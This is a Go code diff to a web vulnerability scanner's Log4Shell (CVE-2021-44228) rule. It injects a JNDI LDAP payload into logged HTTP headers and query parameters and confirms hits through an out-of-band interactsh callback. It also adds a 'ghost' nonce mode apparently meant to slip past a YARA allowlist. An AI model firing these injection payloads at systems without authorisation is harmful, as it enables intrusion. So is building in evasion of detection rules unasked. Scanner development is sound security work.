@@ -56,11 +56,24 @@ import (
 	"encoding/hex"
 	"fmt"
 	"strings"
+	"sync"
 	"time"
 
 	anpuhttp "github.com/anpu-project/anpu/internal/http"
 	"github.com/anpu-project/anpu/pkg/models"
 )
+
+var (
+	log4shellHeaderProbed    sync.Map // endpoint base -> bool (header pass once per endpoint)
+	log4shellListenerEmitted sync.Map // endpoint base -> bool (collapse check-listener Info into one)
+)
+
+func stripLog4shellURL(raw string) string {
+	if i := strings.IndexAny(raw, "?#"); i >= 0 {
+		return raw[:i]
+	}
+	return raw
+}
 
 // Log4ShellOOBHost is the global OOB host set via --oob-host CLI flag.
 // When empty, OOB probing is skipped and only reflection detection runs.
@@ -75,7 +88,12 @@ func (r *log4shellRule) Safety() models.SafetyLevel { return models.SafetyBenign
 func (r *log4shellRule) RequestBudget() int         { return 6 }
 
 // log4shellNonce returns a random 8-byte hex string for OOB tracking.
+// Non-ghost keeps the `anpu` prefix (YARA allowlist); ghost uses
+// Log4ShellNonce() from canary.go (no `anpu` substring).
 func log4shellNonce() string {
+	if GhostEnabled {
+		return Log4ShellNonce()
+	}
 	b := make([]byte, 8)
 	if _, err := rand.Read(b); err != nil {
 		return "anpufallback00"
@@ -111,33 +129,66 @@ var headerNames = []string{
 
 func (r *log4shellRule) Test(ctx context.Context, client *anpuhttp.Client, v models.InputVector) (models.ActiveRuleResult, error) {
 	result := models.ActiveRuleResult{RuleID: r.ID(), Vector: v}
+	endpointBase := stripLog4shellURL(v.URL)
+
+	// --- Automatic OOB confirmation first (when --oob-interactsh is on) ---
+	// OOB attempt runs before any reflection verdict so a confirmed RCE
+	// primitive wins over a weaker echo signal. Header pass is once per
+	// endpoint, not per vector.
+	if InteractSession != nil && Log4ShellOOBHost == "" {
+		oobNonce := log4shellNonce()
+		oobPayload := fmt.Sprintf("${jndi:ldap://%s.%s/x}", oobNonce, InteractSession.Host())
+		// Only the first vector per endpoint spends the OOB header pass.
+		if _, already := log4shellHeaderProbed.LoadOrStore("oob:"+endpointBase, true); !already {
+			oobHeaders := make(map[string]string, len(headerNames))
+			for _, h := range headerNames {
+				oobHeaders[h] = oobPayload
+			}
+			if _, herr := client.DoWithHeaders(ctx, "GET", v.URL, oobHeaders); herr == nil {
+				result.RequestsMade++
+				if proto, remote, ok := InteractSession.WaitForCallback(oobNonce, oobWait); ok {
+					result.Found = true
+					result.OOBConfirmed = true
+					result.OOBProtocol = proto
+					result.OOBRemote = remote
+					result.Payload = oobPayload
+					result.Evidence = fmt.Sprintf(
+						"OOB-confirmed Log4Shell: the application performed a JNDI lookup for nonce %s; "+
+							"interactsh observed a %s callback from %s. Remote code execution primitive proven.",
+						oobNonce, proto, remote,
+					)
+					return result, nil
+				}
+			}
+		}
+	}
 
 	nonce := log4shellNonce()
 	payload := jndiPayload(Log4ShellOOBHost, nonce)
 	result.Payload = payload
 
-	// --- Header injection pass ---
-	// Inject the JNDI string into commonly-logged HTTP headers.
-	// This fires regardless of vector kind — we always add header probes.
-	extraHeaders := make(map[string]string, len(headerNames))
-	for _, h := range headerNames {
-		extraHeaders[h] = payload
-	}
-	headerResp, headerErr := client.DoWithHeaders(ctx, "GET", v.URL, extraHeaders)
-	result.RequestsMade++
-	if headerErr == nil {
-		if reflection := findReflection(string(headerResp.Body), payload, nonce); reflection != "" {
-			result.Found = true
-			result.Evidence = fmt.Sprintf(
-				"Log4Shell JNDI string reflected in response body via header injection on %s. "+
-					"Payload: %s. Reflection: %s",
-				v.URL, payload, reflection,
-			)
-			return result, nil
+	// --- Header injection pass (once per endpoint, not per vector) ---
+	if _, already := log4shellHeaderProbed.LoadOrStore("hdr:"+endpointBase, true); !already {
+		extraHeaders := make(map[string]string, len(headerNames))
+		for _, h := range headerNames {
+			extraHeaders[h] = payload
+		}
+		headerResp, headerErr := client.DoWithHeaders(ctx, "GET", v.URL, extraHeaders)
+		result.RequestsMade++
+		if headerErr == nil {
+			if reflection := findReflection(string(headerResp.Body), payload, nonce); reflection != "" {
+				result.Found = true
+				result.Evidence = fmt.Sprintf(
+					"Log4Shell JNDI string reflected in response body via header injection on %s. "+
+						"Payload: %s. Reflection: %s",
+					v.URL, payload, reflection,
+				)
+				return result, nil
+			}
 		}
 	}
 
-	// --- Query parameter injection ---
+	// --- Query parameter injection (per vector) ---
 	if v.Kind == models.VectorQueryParam && v.Name != "" {
 		probeURL, err := InjectQueryParam(v.URL, v.Name, payload)
 		if err != nil {
@@ -159,17 +210,18 @@ func (r *log4shellRule) Test(ctx context.Context, client *anpuhttp.Client, v mod
 	}
 
 	// --- OOB injection summary (when --oob-host provided) ---
-	// We cannot observe the OOB callback from here. Record that we injected
-	// and surface a Low/Info finding prompting the operator to check the
-	// OOB server. This is the standard pattern for blind SSRF/injection.
+	// Collapsed per-endpoint into one Info: only the first vector per
+	// endpoint emits the "check listener" finding.
 	if Log4ShellOOBHost != "" {
-		result.Found = true
-		result.Evidence = fmt.Sprintf(
-			"Log4Shell JNDI payload injected into %d headers and query parameter on %s. "+
-				"Nonce: %s. Check OOB server %s for DNS/LDAP callbacks with this nonce "+
-				"to confirm exploitation. ANPU cannot observe the callback directly.",
-			len(headerNames), v.URL, nonce, Log4ShellOOBHost,
-		)
+		if _, already := log4shellListenerEmitted.LoadOrStore(endpointBase, true); !already {
+			result.Found = true
+			result.Evidence = fmt.Sprintf(
+				"Log4Shell JNDI payload injected into %d headers and query parameter on %s. "+
+					"Nonce: %s. Check OOB server %s for DNS/LDAP callbacks with this nonce "+
+					"to confirm exploitation. ANPU cannot observe the callback directly.",
+				len(headerNames), v.URL, nonce, Log4ShellOOBHost,
+			)
+		}
 	}
 
 	return result, nil
@@ -193,7 +245,11 @@ func (r *log4shellRule) ToFinding(res models.ActiveRuleResult, target string) mo
 	confidence := models.ConfidenceLow
 	title := "Log4Shell JNDI payload injected — check OOB server for callback"
 
-	if strings.Contains(res.Evidence, "reflected in response body") {
+	if res.OOBConfirmed {
+		severity = models.SeverityCritical
+		confidence = models.ConfidenceHigh
+		title = "Log4Shell JNDI lookup confirmed via out-of-band callback (CVE-2021-44228)"
+	} else if strings.Contains(res.Evidence, "reflected in response body") {
 		severity = models.SeverityCritical
 		confidence = models.ConfidenceMedium
 		title = "Log4Shell JNDI string reflected — potential CVE-2021-44228 indicator"
